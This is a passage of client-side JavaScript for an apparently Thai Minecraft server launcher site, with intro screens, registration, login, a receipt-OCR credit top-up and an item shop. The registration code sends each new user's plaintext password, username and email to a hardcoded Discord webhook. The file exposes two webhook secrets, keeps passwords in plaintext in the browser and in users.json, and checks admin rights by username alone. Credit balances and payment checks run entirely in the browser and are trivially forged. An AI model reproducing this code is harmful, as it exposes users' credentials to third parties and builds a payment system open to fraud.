document.addEventListener('DOMContentLoaded', () => {
    
    // --- 1. Element References ---
    const disclaimerScreen = document.getElementById('disclaimer-screen');
    const openingScreen = document.getElementById('opening-screen');
    const titleScreen = document.getElementById('title-screen');
    const launcherHub = document.getElementById('launcher-hub');
    
    const btnContinue = document.getElementById('btn-continue');
    const skipIntroBtn = document.getElementById('skip-intro-btn');
    
    // Media Elements
    const openingVideo = document.getElementById('opening-video');
    const titleVideo = document.getElementById('title-video-bg'); 
    const bgmOpening = document.getElementById('bgm-opening'); 
    const bgmHub = document.getElementById('bgm-hub');
    const sfxClick = document.getElementById('sfx-click'); 
    const tipTextElement = document.getElementById('mc-tip-text');

    let isSoundOn = true;
    let tipInterval;

    // 🔗 =========================================================================
    // ลิงก์ Discord Webhook สำหรับแจ้งเตือนทั่วไปและการเติมเงิน/ซื้อไอเทม
    // =========================================================================
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1510724050526273607/Q5p1jSkMAl9o5QGk3JtKPgobfWnC1SMi7PlMtvaxwog_CF8GpE8PQ767cNr6q43wUleJ";
    
    // 🔗 ลิงก์ Discord Webhook ตัวใหม่ สำหรับส่งข้อมูลคนสมัครสมาชิกใหม่ (ID ห้อง: 1510991328471814224)
    const DISCORD_REGISTER_WEBHOOK_URL = "https://discord.com/api/webhooks/1510992956512014547/zCyW97dJh7ltoqSByrUjyFDHmMEcw9QoGvZRw16ykxStc3iipN5OObfd08bOPho1YpKv";

    function sendDiscordLog(messageContent) {
        if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.startsWith("https://")) {
            console.error("❌ ไม่สามารถส่งข้อมูลได้: เนื่องจาก DISCORD_WEBHOOK_URL ไม่ถูกต้อง");
            return;
        }

        fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: messageContent })
        })
        .then(async response => {
            if (!response.ok) {
                const errorText = await response.text();
                console.error(`❌ Discord Webhook Error (${response.status}):`, errorText);
            } else {
                console.log("✅ ส่งข้อมูลแจ้งเตือนไปยัง Discord ผ่าน Webhook สำเร็จ");
            }
        })
        .catch(error => {
            console.error("❌ เกิดข้อผิดพลาดเกี่ยวกับเครือข่ายในการส่ง Webhook:", error);
        });
    }

    // ฟังก์ชันส่งข้อมูลผู้สมัครใหม่ไปที่บอทดิสคอร์ด (ห้องและบอทตัวใหม่ตามที่คุณต้องการ)
    function sendDiscordRegisterLog(username, email, password) {
        if (!DISCORD_REGISTER_WEBHOOK_URL || !DISCORD_REGISTER_WEBHOOK_URL.startsWith("https://")) {
            console.error("❌ ไม่สามารถส่งข้อมูลสมัครสมาชิกได้: เนื่องจาก DISCORD_REGISTER_WEBHOOK_URL ไม่ถูกต้อง");
            return;
        }

        // สร้าง Embed เพื่อความสวยงาม เป็นระเบียบ แอดมินคัดลอกข้อมูลไปใส่ users.json ง่าย
        const discordPayload = {
            username: "Minecraft Auto-Registry Bot",
            avatar_url: "https://i.imgur.com/8Q5F5Xn.png", 
            embeds: [{
                title: "📥 มีผู้เล่นสมัครสมาชิกเข้ามาใหม่!",
                color: 3066993, // สีเขียว Minecraft
                description: `โปรดนำข้อมูลนี้ไปอัปเดตลงในไฟล์ \`users.json\` หลังบ้านเพื่อเปิดระบบออนไลน์`,
                fields: [
                    { name: "👤 ชื่อผู้เล่น (Username)", value: `\`${username}\``, inline: true },
                    { name: "🔑 รหัสผ่าน (Password)", value: `\`${password}\``, inline: true },
                    { name: "📧 อีเมลผู้ใช้งาน (Email)", value: `\`${email}\``, inline: false },
                    { name: "🕒 เวลาทำรายการ", value: new Date().toLocaleString('th-TH'), inline: false }
                ],
                footer: {
                    text: "ID ห้องรับแจ้งเตือน: 1510991328471814224"
                }
            }]
        };

        fetch(DISCORD_REGISTER_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(discordPayload)
        })
        .then(async response => {
            if (!response.ok) {
                const errorText = await response.text();
                console.error(`❌ Discord Register Webhook Error (${response.status}):`, errorText);
            } else {
                console.log("✅ ส่งข้อมูลแจ้งผู้สมัครใหม่ไปยัง Discord Webhook เรียบร้อยแล้ว");
            }
        })
        .catch(error => {
            console.error("❌ เกิดข้อผิดพลาดในการส่ง Webhook สมัครสมาชิก:", error);
        });
    }

    // --- 2. DISCLAIMER TO OPENING VIDEO ---
    btnContinue.addEventListener('click', () => {
        playClickSound();
        disclaimerScreen.style.opacity = '0';
        disclaimerScreen.style.transition = 'opacity 0.5s';
        
        setTimeout(() => {
            disclaimerScreen.classList.add('hidden');
            playOpeningVideo(); 
        }, 500);
    });

    // --- 3. PLAY OPENING VIDEO ---
    function playOpeningVideo() {
        openingScreen.classList.remove('hidden');
        
        if (openingVideo) {
            openingVideo.currentTime = 0;
            openingVideo.play().catch(e => {
                console.log("Auto-play prevented", e);
                skipToTitle(); 
            });

            openingVideo.onended = () => {
                skipToTitle();
            };
        } else {
            skipToTitle();
        }
    }

    skipIntroBtn.addEventListener('click', () => {
        playClickSound();
        skipToTitle();
    });

    // --- 4. SKIP TO TITLE SCREEN (TRAILER) ---
    function skipToTitle() {
        if (openingVideo) {
            openingVideo.pause();
        }

        if (isSoundOn && bgmOpening) {
            bgmOpening.currentTime = 0;
            bgmOpening.volume = 0.5;
            bgmOpening.play().catch(e => console.log("Audio Play Blocked", e));
        }
        
        openingScreen.style.opacity = '0';
        openingScreen.style.transition = 'opacity 0.5s';

        setTimeout(() => {
            openingScreen.classList.add('hidden');
            showTitleScreen();
        }, 500);
    }

    function showTitleScreen() {
        titleScreen.classList.remove('hidden');
        setTimeout(() => { 
            titleScreen.classList.add('active'); 
        }, 50);

        if (isSoundOn) {
            if (titleVideo) {
                titleVideo.muted = true; 
                titleVideo.currentTime = 0;
                titleVideo.play().catch(e => console.log("Video Play Blocked", e));
            }
        }
        startTipRotation();
    }

    // --- 5. TRANSITION TO LAUNCHER HUB ---
    titleScreen.addEventListener('click', () => {
        if (titleScreen.classList.contains('leaving')) return;
        playClickSound();
        clearInterval(tipInterval);
        
        fadeOutAudio(bgmOpening, 1000);
        if (titleVideo) titleVideo.pause();

        setTimeout(() => { 
            fadeInAudio(bgmHub, 1500, 0.3); 
        }, 800);

        titleScreen.classList.add('leaving');
        titleScreen.style.opacity = '0';
        setTimeout(() => {
            titleScreen.classList.add('hidden');
            launcherHub.classList.remove('hidden');
        }, 1000);
    });

    // --- 6. UTILITIES ---
    function playClickSound() {
        if (sfxClick && isSoundOn) {
            sfxClick.currentTime = 0; 
            sfxClick.volume = 0.5; 
            sfxClick.play().catch(err => {});
        }
    }

    function fadeOutAudio(audio, duration = 1000) {
        if (!audio || audio.paused) return;
        let startVol = audio.volume;
        let step = startVol / (duration / 50);
        let fadeInterval = setInterval(() => {
            if (audio.volume - step <= 0) {
                audio.volume = 0;
                audio.pause();
                clearInterval(fadeInterval);
            } else {
                audio.volume -= step;
            }
        }, 50);
    }

    function fadeInAudio(audio, duration = 1000, maxVol = 0.4) {
        if (!audio) return;
        audio.volume = 0;
        audio.play().catch(err => {});
        let step = maxVol / (duration / 50);
        let currentVol = 0;
        let fadeInterval = setInterval(() => {
            currentVol += step;
            if (currentVol >= maxVol) {
                audio.volume = maxVol;
                clearInterval(fadeInterval);
            } else {
                audio.volume = currentVol;
            }
        }, 50);
    }

    const mcTips = [
        "Tip: อย่าขุดดินลงไปตรงๆ!",
        "Tip: พกอาหารติดตัวไว้เสมอ!",
        "Tip: ใส่ชุดเกราะเพชรก่อนไปสู้กับมังกร!",
        "Tip: ครีปเปอร์ระเบิดเมื่อเข้าใกล้",
        "Tip: กดปุ่มสีเขียวด้านล่างเพื่อเข้า Discord"
    ];
    
    function startTipRotation() {
        tipTextElement.innerText = mcTips[Math.floor(Math.random() * mcTips.length)];
        tipTextElement.classList.add('visible');
        tipInterval = setInterval(() => {
            tipTextElement.classList.remove('visible');
            setTimeout(() => {
                tipTextElement.innerText = mcTips[Math.floor(Math.random() * mcTips.length)];
                tipTextElement.classList.add('visible');
            }, 1000); 
        }, 5000); 
    }

    // =========================================================================
    // ระบบสลับหน้า View 
    // =========================================================================
    window.switchView = function(viewId) {
        playClickSound();
        
        const allViews = document.querySelectorAll('.content-view');
        allViews.forEach(view => {
            view.classList.add('hidden');
        });
        
        const targetView = document.getElementById(viewId);
        if (targetView) {
            targetView.classList.remove('hidden');
        }

        if (viewId === 'profile-settings' && currentUser) {
            const editUserInput = document.getElementById('edit-username');
            if (editUserInput) editUserInput.value = currentUser.username;
        }
    };

    window.navigateGame = function(url) {
        playClickSound();
        window.location.href = url;
    };


    // =========================================================================
    // --- 7. AUTH CORE + HYBRID SYSTEM INTEGRATION ---
    // =========================================================================

    let users = JSON.parse(localStorage.getItem('users')) || [];
    let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;

    let generatedOTP = null;
    let targetResetUser = null;

    // โดเมนหลอกสำหรับรองรับไอดีผู้เล่นเก่ากรณีไม่มีอีเมลในระบบ
    const FAKE_DOMAIN = "@minecraftserver.auth";

    // ระบบโหลดและผสานข้อมูลจากไฟล์ users.json (ดึงข้อมูลเรียลไทม์ควบคู่ประวัติเดิมในเบราว์เซอร์)
    async function loadUsersFromJson() {
        try {
            const response = await fetch('users.json?v=' + new Date().getTime());
            if (response.ok) {
                const jsonUsers = await response.json();
                let userMap = new Map();
                
                users.forEach(u => {
                    if (u && u.username) userMap.set(u.username.toLowerCase(), u);
                });
                
                jsonUsers.forEach(u => {
                    if (u && u.username) {
                        const key = u.username.toLowerCase();
                        if (userMap.has(key)) {
                            userMap.set(key, { ...userMap.get(key), ...u });
                        } else {
                            userMap.set(key, u);
                        }
                    }
                });
                
                users = Array.from(userMap.values());
                localStorage.setItem('users', JSON.stringify(users));
                
                if (currentUser) {
                    const updatedCurrent = users.find(u => u.username.toLowerCase() === currentUser.username.toLowerCase());
                    if (updatedCurrent) {
                        currentUser = updatedCurrent;
                        localStorage.setItem('currentUser', JSON.stringify(currentUser));
                    }
                }
                
                updateProfileUI();
                console.log("💾 [ระบบไฮบริด] ประมวลผลและอัปเดตฐานข้อมูลไฟล์ users.json เรียบร้อยแล้ว!");
            }
        } catch (error) {
            console.warn("⚠️ ไม่พบไฟล์ users.json หรือเกิดปัญหาเครือข่าย ระบบจึงใช้ฐานข้อมูล LocalStorage ต่อไป:", error);
        }
    }

    function updateProfileUI() {
        const authContainer = document.getElementById('auth-container');
        const profileContainer = document.getElementById('user-profile-container');
        const sidebarName = document.getElementById('user-name-display');
        
        const profileAvatarDisplay = document.getElementById('profile-avatar-display');
        const sidebarAvatarDisplay = document.getElementById('sidebar-avatar-display');

        if (currentUser) {
            if (currentUser.credit === undefined) {
                currentUser.credit = 0;
            }

            if(authContainer) authContainer.classList.add('hidden');
            if(profileContainer) profileContainer.classList.remove('hidden');
            
            document.getElementById('display-username').innerText = currentUser.username;
            document.getElementById('display-email').innerText = currentUser.email || "ไม่ได้ระบุอีเมล";
            
            const isAdmin = currentUser.username && currentUser.username.toLowerCase() === 'hello_kitty_th';
            if (sidebarName) {
                if (isAdmin) {
                    sidebarName.innerText = `${currentUser.username} [credit : ∞ (Admin)]`;
                } else {
                    sidebarName.innerText = `${currentUser.username} [credit : ${currentUser.credit}]`;
                }
            }

            const userAvatar = currentUser.avatar || 'po.jpeg';
            if(profileAvatarDisplay) profileAvatarDisplay.src = userAvatar;
            if(sidebarAvatarDisplay) sidebarAvatarDisplay.src = userAvatar;

        } else {
            if(authContainer) authContainer.classList.remove('hidden');
            if(profileContainer) profileContainer.classList.add('hidden');
            if(sidebarName) sidebarName.innerText = "Guest Player";
            
            if(profileAvatarDisplay) profileAvatarDisplay.src = 'po.jpeg';
            if(sidebarAvatarDisplay) sidebarAvatarDisplay.src = 'po.jpeg';
        }
    }

    // =========================================================================
    // ระบบสมัครสมาชิก (Register) ใหม่ -> ส่งบอทดิสคอร์ด + สมัครออนไลน์ขึ้น Firebase
    // =========================================================================
    window.handleRegister = async function() {
        playClickSound();
        const usernameInput = document.getElementById('reg-username').value.trim();
        const emailInput = document.getElementById('reg-email').value.trim();
        const passwordInput = document.getElementById('reg-password').value.trim();

        if (!usernameInput || !emailInput || !passwordInput) {
            return alert("❌ กรุณากรอกข้อมูลให้ครบถ้วนทุกช่องครับ");
        }

        if (!validateEmail(emailInput)) {
            return alert("❌ รูปแบบอีเมลไม่ถูกต้อง");
        }

        if (passwordInput.length < 6) {
            return alert("❌ รหัสผ่านตามระบบความปลอดภัย Firebase ต้องมีความยาว 6 ตัวขึ้นไปครับ");
        }

        await loadUsersFromJson();

        const isUsernameTaken = users.some(user => user.username.toLowerCase() === usernameInput.toLowerCase());
        if (isUsernameTaken) {
            return alert("❌ ชื่อผู้เล่นนี้ถูกใช้งานในระบบแล้ว");
        }

        const isEmailTaken = users.some(user => user.email && user.email.toLowerCase() === emailInput.toLowerCase());
        if (isEmailTaken) {
            return alert("❌ อีเมลนี้เคยใช้สมัครสมาชิกแล้ว");
        }

        try {
            // 1. ส่งข้อมูลขึ้นลงทะเบียนออนไลน์คลาวด์ Firebase Authentication
            const userCredential = await firebase.auth().createUserWithEmailAndPassword(emailInput, passwordInput);
            const firebaseUser = userCredential.user;

            const newUser = {
                username: usernameInput,
                email: emailInput,
                password: passwordInput,
                avatar: null,
                credit: 0,
                uid: firebaseUser.uid
            };

            // 2. ส่งแจ้งเตือนเข้าห้อง Discord Webhook ของคุณ
            sendDiscordRegisterLog(usernameInput, emailInput, passwordInput);

            // 3. เก็บลง Local ตัวเบราว์เซอร์เพื่อความสะดวก
            users.push(newUser);
            localStorage.setItem('users', JSON.stringify(users));

            alert("🎉 สมัครสมาชิกออนไลน์สำเร็จเรียบร้อย! ข้อมูลถูกซิงค์เข้าระบบกลางคลาวด์และส่งหาทีมงานแล้วครับ");
            document.getElementById('reg-username').value = '';
            document.getElementById('reg-email').value = '';
            document.getElementById('reg-password').value = '';
            switchAuthTab('login');
        } catch (error) {
            console.error(error);
            if (error.code === 'auth/email-already-in-use') {
                alert("❌ อีเมลนี้ถูกใช้ไปแล้วในระบบ Firebase!");
            } else {
                alert("❌ เกิดปัญหาการเชื่อมต่อฐานข้อมูลคลาวด์สมัครสมาชิก: " + error.message);
            }
        }
    };

    // =========================================================================
    // ระบบเข้าสู่ระบบ (Login) ตรวจสอบผ่าน Firebase + ระบบประวัติสำรอง
    // =========================================================================
    window.handleLogin = async function() {
        playClickSound();
        const identifierInput = document.getElementById('login-identifier').value.trim();
        const passwordInput = document.getElementById('login-password').value.trim();

        if (!identifierInput || !passwordInput) {
            return alert("❌ กรุณากรอกไอดีและรหัสผ่าน");
        }

        await loadUsersFromJson();

        // ค้นหาบัญชีจากฐานข้อมูลประวัติในเว็บก่อนเพื่อระบุฟอร์แมตอีเมลจริง
        const matchedUser = users.find(user => 
            (user.username.toLowerCase() === identifierInput.toLowerCase() || (user.email && user.email.toLowerCase() === identifierInput.toLowerCase()))
        );

        let loginSuccess = false;

        if (matchedUser) {
            // หากมีประวัติ ให้สร้างฟอร์แมตล็อกอิน (ใช้อีเมลจริง หรือถ้าไม่มีให้แปลงใช้ไอดีครอบโดเมนจำลอง)
            const loginEmail = matchedUser.email || (matchedUser.username.toLowerCase() + FAKE_DOMAIN);
            
            try {
                // [ทางเลือก 1] พยายามล็อกอินผ่านความปลอดภัยคลาวด์ Firebase ก่อน
                const userCredential = await firebase.auth().signInWithEmailAndPassword(loginEmail, passwordInput);
                currentUser = matchedUser;
                if (!currentUser.uid) currentUser.uid = userCredential.user.uid;
                loginSuccess = true;
            } catch (fbError) {
                console.warn("⚠️ ล็อกอินผ่าน Firebase ไม่สำเร็จ กำลังพยายามเช็คด้วยระบบประวัติสำรอง Local/JSON...", fbError.message);
                // [ทางเลือก 2] หากไอดีอยู่ใน users.json แต่แอดมินยังไม่ได้ Import ขึ้น Firebase ให้เช็ครหัสตรงๆ เพื่อให้ผ่านเข้าเล่นได้
                if (matchedUser.password === passwordInput) {
                    currentUser = matchedUser;
                    loginSuccess = true;
                }
            }
        } else {
            // หากไม่มีข้อมูลในเครื่อง/JSON แต่ผู้เล่นพิมพ์เป็นอีเมลมาตรงๆ ให้ลองยิงเข้า Firebase ตรงๆ
            if (/\S+@\S+\.\S+/.test(identifierInput)) {
                try {
                    const userCredential = await firebase.auth().signInWithEmailAndPassword(identifierInput, passwordInput);
                    currentUser = {
                        username: identifierInput.split('@')[0],
                        email: identifierInput,
                        password: passwordInput,
                        credit: 0,
                        uid: userCredential.user.uid
                    };
                    loginSuccess = true;
                } catch (e) {}
            }
        }

        if (loginSuccess) {
            localStorage.setItem('currentUser', JSON.stringify(currentUser));
            document.getElementById('login-identifier').value = '';
            document.getElementById('login-password').value = '';
            alert(`👋 ยินดีต้อนรับกลับมา! คุณ ${currentUser.username}`);
            updateProfileUI();
        } else {
            alert("❌ ไอดีผู้เล่นหรือรหัสผ่านไม่ถูกต้อง หรือโปรดรอแอดมินเขียนข้อมูลอัปเดตลงระบบหลังบ้าน");
        }
    };

    window.handleLogout = function() {
        playClickSound();
        currentUser = null;
        localStorage.removeItem('currentUser');
        updateProfileUI();
        alert("🔒 ออกจากระบบเรียบร้อยแล้ว");
    };

    // ระบบเติมเงินสแกนสลิปโอนเงิน (Tesseract OCR Engine)
    window.handleTopupSubmit = function() {
        playClickSound();
        if (!currentUser) return alert("❌ กรุณาเข้าสู่ระบบก่อนทำรายการเติมเงินครับ");

        const slipFile = document.getElementById('topup-slip').files[0];
        const submitBtn = document.getElementById('topup-submit-btn');
        const statusText = document.getElementById('topup-status');

        if (!slipFile) {
            return alert("❌ กรุณาแนบรูปภาพใบเสร็จโอนเงินให้เรียบร้อยครับ");
        }

        submitBtn.disabled = true;
        submitBtn.style.opacity = "0.5";
        statusText.style.display = "block";
        statusText.innerText = "⏳ กำลังใช้ AI ปรับแต่งภาพและสแกนยอดเงินอัตโนมัติ...";

        const preprocessImage = (file) => {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        const maxDim = 1200;
                        let w = img.width, h = img.height;
                        if (w > maxDim || h > maxDim) {
                            if (w > h) { h = (maxDim / w) * h; w = maxDim; }
                            else { w = (maxDim / h) * w; h = maxDim; }
                        }
                        canvas.width = w; canvas.height = h;
                        ctx.drawImage(img, 0, 0, w, h);
                        
                        const imgData = ctx.getImageData(0, 0, w, h);
                        const data = imgData.data;
                        for (let i = 0; i < data.length; i += 4) {
                            const brightness = 0.2126 * data[i] + 0.7152 * data[i+1] + 0.0722 * data[i+2];
                            const contrast = 1.4;
                            const factor = (259 * (contrast + 255)) / (255 * (259 - contrast));
                            let nv = factor * (brightness - 128) + 128;
                            nv = Math.max(0, Math.min(255, nv));
                            data[i] = data[i+1] = data[i+2] = nv;
                        }
                        ctx.putImageData(imgData, 0, 0);
                        resolve(canvas.toDataURL('image/jpeg', 0.85));
                    };
                    img.src = e.target.result;
                };
                reader.readAsDataURL(file);
            });
        };

        preprocessImage(slipFile).then(processedImg => {
            Tesseract.recognize(
                processedImg,
                'tha+eng', 
                { logger: m => {
                    if (m.status === 'recognizing text') {
                        statusText.innerText = `⏳ กำลังวิเคราะห์สลิปอย่างละเอียด: ${Math.round(m.progress * 100)}%`;
                    }
                }}
            ).then(({ data: { text } }) => {
                submitBtn.disabled = false;
                submitBtn.style.opacity = "1";
                statusText.style.display = "none";

                let parsedAmount = 0;
                const lines = text.split('\n');
                
                for (let line of lines) {
                    if (/จำนวนเงิน|ยอดเงิน|ยอดโอน|โอนเงิน|Amount|Total|สุทธิ|บาท/i.test(line)) {
                        const cleanLine = line.replace(/,/g, ''); 
                        const moneyMatch = cleanLine.match(/\d+(\s*\.\s*\d{2})?/);
                        if (moneyMatch) {
                            parsedAmount = parseFloat(moneyMatch[0].replace(/\s/g, ''));
                            if (parsedAmount > 0) break;
                        }
                    }
                }

                if (parsedAmount === 0) {
                    const genericMatches = text.replace(/,/g, '').match(/\d+\s*\.\s*\d{2}/g);
                    if (genericMatches) {
                        for (let match of genericMatches) {
                            let val = parseFloat(match.replace(/\s/g, ''));
                            if (val > 0 && val < 50000) { 
                                parsedAmount = val;
                                break;
                            }
                        }
                    }
                }

                if (parsedAmount === 0) {
                    for (let line of lines) {
                        if (/จำนวนเงิน|ยอดเงิน|ยอดโอน|โอนเงิน/i.test(line)) {
                            const numbers = line.replace(/,/g, '').match(/\d+/g);
                            if (numbers) {
                                for (let num of numbers) {
                                    let val = parseFloat(num);
                                    if (val >= 10 && val < 50000) {
                                        parsedAmount = val;
                                        break;
                                    }
                                }
                            }
                        }
                        if (parsedAmount > 0) break;
                    }
                }

                if (parsedAmount === 0) {
                    let manualAmount = prompt("❌ AI ไม่สามารถสแกนยอดเงินอัตโนมัติได้ชัดเจน\nกรุณาระบุจำนวนเงินโอนจริงเพื่อบันทึกข้อมูลส่งให้แอดมินตรวจ:");
                    if (!manualAmount || isNaN(manualAmount) || parseFloat(manualAmount) <= 0) {
                        const scamLog = `⚠️ **[ระบบสแกนไม่สำเร็จ]**\nผู้เล่น \`${currentUser.username}\` ส่งรูปภาพสลิปแต่ระบบอ่านยอดเงินไม่ได้ หรือผู้เล่นกดยกเลิกรายการ`;
                        sendDiscordLog(scamLog);
                        return alert("❌ การทำรายการแจ้งเติมเงินถูกยกเลิก");
                    }
                    parsedAmount = parseFloat(manualAmount);
                }

                let diffMinutes = 0;
                let timeCheckedByText = false;
                let slipDateStr = "";

                const thaiMonths = {
                    "ม.ค.": 0, "ก.พ.": 1, "มี.ค.": 2, "เม.ย.": 3, "พ.ค.": 4, "มิ.ย.": 5,
                    "ก.ค.": 6, "ส.ค.": 7, "ก.ย.": 8, "ต.ค.": 9, "พ.ย.": 10, "ธ.ค.": 11
                };

                const trueMoneyDateMatch = text.match(/(\d{1,2})\s*(ม\.ค\.|ก\.พ\.|มี\.ค\.|เม\.ย\.|พ\.ค\.|มิ\.ย\.|ก\.ค\.|ส\.ค\.|ก\.ย\.|ต\.ค\.|พ\.ย\.|ธ\.ค\.)\s*(\d{4})\s*(\d{2}):(\d{2}):(\d{2})/);

                if (trueMoneyDateMatch) {
                    const day = parseInt(trueMoneyDateMatch[1]);
                    const monthStr = trueMoneyDateMatch[2].trim();
                    const yearBE = parseInt(trueMoneyDateMatch[3]);
                    const hour = parseInt(trueMoneyDateMatch[4]);
                    const minute = parseInt(trueMoneyDateMatch[5]);
                    const second = parseInt(trueMoneyDateMatch[6]);

                    const month = thaiMonths[monthStr];
                    const yearCE = yearBE - 543;

                    const slipDateTime = new Date(yearCE, month, day, hour, minute, second);
                    const currentTime = new Date();

                    const diffTimeMs = currentTime.getTime() - slipDateTime.getTime();
                    diffMinutes = Math.floor(diffTimeMs / (1000 * 60));
                    timeCheckedByText = true;
                    slipDateStr = `${day} ${monthStr} ${yearBE} ${hour}:${minute}:${second}`;
                }

                if (!timeCheckedByText) {
                    const currentTime = Date.now();
                    const fileTime = slipFile.lastModified;
                    const diffTimeMs = currentTime - fileTime;
                    diffMinutes = Math.floor(diffTimeMs / (1000 * 60));
                    slipDateStr = new Date(fileTime).toLocaleString('th-TH');
                }

                if (diffMinutes > 15) {
                    return alert(`❌ ใบเสร็จนี้หมดอายุแล้ว!\nคุณส่งข้อมูลช้าเกินไป เกินเวลาที่กำหนด (ผ่านไป ${diffMinutes} นาที)\nเวลาในใบเสร็จ: ${slipDateStr}`);
                } else if (diffMinutes < -15) { 
                    return alert("❌ พบความผิดปกติของเวลาในสลิป โปรดตรวจสอบเวลาของเครื่องคอมพิวเตอร์หรือโทรศัพท์ของคุณให้ตรงกับเวลาปัจจุบัน");
                }

                const cleanText = text.replace(/[^a-zA-Z0-9]/g, '');
                const match = cleanText.match(/[a-zA-Z0-9]{14,32}/);

                if (!match) {
                    const fallbackMatch = cleanText.match(/\d{10,25}/);
                    if (!fallbackMatch) {
                        const scamLog = `⚠️ **[ระบบอ่านสลิปไม่สำเร็จ]**\nไม่พบเลขที่อ้างอิงบนใบเสร็จของ \`${currentUser.username}\` (สลิปอาจไม่ชัดเจน)`;
                        sendDiscordLog(scamLog);
                        return alert("❌ ไม่พบเลขที่รายการบนสลิป โปรดใช้ภาพสลิปที่คมชัดเต็มใบ หรือติดต่อแอดมินใน Discord ครับ");
                    }
                    var extractedRef = fallbackMatch[0].toUpperCase();
                } else {
                    var extractedRef = match[0].toUpperCase();
                }

                let usedRefs = JSON.parse(localStorage.getItem('usedRefs')) || [];
                
                if (usedRefs.includes(extractedRef)) {
                    const duplicateLog = `❌ **[แจ้งเตือนสลิปเก่าซ้ำ]**\nเติมเงินไม่สำเร็จเนื่องจาก \`${currentUser.username}\` ได้นำสลิปเก่ามาเคลมซ้ำ\n🆔 **เลขที่รายการที่ใช้ซ้ำ:** \`${extractedRef}\``;
                    sendDiscordLog(duplicateLog);
                    return alert(`❌ ไม่สามารถทำรายการได้! เลขที่รายการ "${extractedRef}" ถูกใช้งานไปแล้ว`);
                }

                const userIndex = users.findIndex(user => user.username.toLowerCase() === currentUser.username.toLowerCase());
                if (userIndex !== -1) {
                    if (users[userIndex].credit === undefined) users[userIndex].credit = 0;
                    users[userIndex].credit += parsedAmount;

                    currentUser = users[userIndex];
                    localStorage.setItem('users', JSON.stringify(users));
                    localStorage.setItem('currentUser', JSON.stringify(currentUser));

                    usedRefs.push(extractedRef);
                    localStorage.setItem('usedRefs', JSON.stringify(usedRefs));

                    alert(`🎉 เติมเงินสำเร็จ! ยอดเงินจำนวน ${parsedAmount} บาท เข้าบัญชีเรียบร้อยแล้วครับ`);

                    const isAdmin = currentUser.username && currentUser.username.toLowerCase() === 'hello_kitty_th';
                    const adminTag = isAdmin ? " 👑 [ADMIN]" : "";

                    const discordMessage = `💵 **[แจ้งเตือนการเติมเงินสำเร็จ]**\n👤 **ผู้เล่น:** \`${currentUser.username}\` (${currentUser.email})${adminTag}\n💰 **ยอดเงินเติม:** \`${parsedAmount}\` บาท\n🆔 **เลขที่รายการ:** \`${extractedRef}\``;
                    sendDiscordLog(discordMessage);

                    document.getElementById('topup-slip').value = '';
                    updateProfileUI();
                }

            }).catch(err => {
                console.error(err);
                submitBtn.disabled = false;
                submitBtn.style.opacity = "1";
                statusText.style.display = "none";
                
                const errorLog = `⚠️ **[ระบบตรวจสลิปขัดข้อง]**\nไม่สามารถประมวลผลไฟล์ภาพสลิปของ \`${currentUser.username}\` ได้เนื่องจากเอนจิ้น OCR เกิดข้อผิดพลาด`;
                sendDiscordLog(errorLog);

                alert("❌ เกิดข้อผิดพลาดของระบบตรวจสแกน โปรดลองใหม่อีกครั้งหรือติดต่อแอดมินโดยตรงครับ");
            });
        });
    };

    window.handleBuyItem = function(itemName, price) {
        playClickSound();
        if (!currentUser) {
            return alert("❌ โปรดเข้าสู่ระบบก่อนทำการซื้อของครับ");
        }

        const isAdmin = currentUser.username && currentUser.username.toLowerCase() === 'hello_kitty_th';
        if (currentUser.credit === undefined) currentUser.credit = 0;

        if (!isAdmin && currentUser.credit < price) {
            return alert(`❌ เครดิตของคุณไม่เพียงพอ! ${itemName} ราคา ${price} เครดิต (คุณมี ${currentUser.credit} เครดิต)`);
        }

        if (confirm(`🛒 คุณต้องการซื้อ "${itemName}" ในราคา ${price} เครดิต ใช่หรือไม่?`)) {
            const userIndex = users.findIndex(user => user.username.toLowerCase() === currentUser.username.toLowerCase());
            if (userIndex !== -1) {
                
                if (!isAdmin) {
                    users[userIndex].credit -= price;
                }
                
                currentUser = users[userIndex];
                localStorage.setItem('users', JSON.stringify(users));
                localStorage.setItem('currentUser', JSON.stringify(currentUser));
                
                const remainingCreditText = isAdmin ? "∞" : `${currentUser.credit}`;
                alert(`🎁 ซื้อไอเทม "${itemName}" สำเร็จแล้ว! เครดิตคงเหลือของคุณคือ ${remainingCreditText} เครดิต\nจะได้รับภายใน 48 ชั่วโมงถ้ายังไม่ได้ให้จิกแอ็ดมินเลย 55+`);

                const creditLogText = isAdmin ? "∞ (Admin)" : `${currentUser.credit}`;
                const adminTag = isAdmin ? " 👑 [ADMIN]" : "";
                
                const discordMessage = `# 🛒 **[แจ้งเตือนการซื้อไอเทม]**\n👤 **ผู้เล่น:** \`${currentUser.username}\` (${currentUser.email})${adminTag}\n🎁 **ไอเทมที่ซื้อ:** \`${itemName}\`\n💎 **ราคาสินค้า:** \`${price}\` เครดิต\n💳 **เครดิตคงเหลือ:** \`${creditLogText}\` เครดิต \n<@&1238056762284839003>`;
                sendDiscordLog(discordMessage);

                updateProfileUI();
            }
        }
    };

    window.switchAuthTab = function(tab) {
        playClickSound();
        const loginForm = document.getElementById('login-form');
        const registerForm = document.getElementById('register-form');
        const forgotForm = document.getElementById('forgot-form');
        const otpVerifyForm = document.getElementById('otp-verify-form');
        
        const btnTabLogin = document.getElementById('btn-tab-login');
        const btnTabRegister = document.getElementById('btn-tab-register');

        loginForm.classList.add('hidden');
        registerForm.classList.add('hidden');
        forgotForm.classList.add('hidden');
        otpVerifyForm.classList.add('hidden');

        if (tab === 'login') {
            loginForm.classList.remove('hidden');
            btnTabLogin.className = "mc-btn-primary";
            btnTabRegister.className = "mc-btn-secondary";
        } else if (tab === 'register') {
            registerForm.classList.remove('hidden');
            btnTabLogin.className = "mc-btn-secondary";
            btnTabRegister.className = "mc-btn-primary";
        } else if (tab === 'forgot') {
            forgotForm.classList.remove('hidden');
            btnTabLogin.className = "mc-btn-secondary";
            btnTabRegister.className = "mc-btn-secondary";
        } else if (tab === 'otp') {
            otpVerifyForm.classList.remove('hidden');
            btnTabLogin.className = "mc-btn-secondary";
            btnTabRegister.className = "mc-btn-secondary";
        }
